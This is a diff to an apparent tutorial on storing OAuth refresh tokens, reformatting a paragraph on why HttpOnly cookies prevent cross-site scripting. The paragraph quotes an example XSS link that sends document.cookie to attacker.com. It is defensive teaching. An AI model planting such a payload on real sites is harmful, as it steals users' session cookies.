@@ -17,7 +17,8 @@ Okay, so now have all the concepts in order. Now let us get to the code. We want
 - When the access token expires the client request the API for a new token
 - The API sends the request token to the OAuth server for validation
 -I f valid, steps 4-6 repeats
-- The reason why you should save the refresh token as a HttpOnly cookie is to prevent Cross-site scripting (XSS) attacks. The -HttpOnly flag tells the browser that this cookie should not be accessible through javascript. If this flag was not set and your site let users post unfiltered HTML and javascript a malicious user could post something like this
+
+The reason why you should save the refresh token as a HttpOnly cookie is to prevent Cross-site scripting (XSS) attacks. The -HttpOnly flag tells the browser that this cookie should not be accessible through javascript. If this flag was not set and your site let users post unfiltered HTML and javascript a malicious user could post something like this
 
 <a href="#" onclick="window.location = 'http://attacker.com/stole.cgi?text=' + escape(document.cookie); return false;">Click here!</a>
 Malicious code is shamelessly stolen from Wikipedia: HTTP cookie
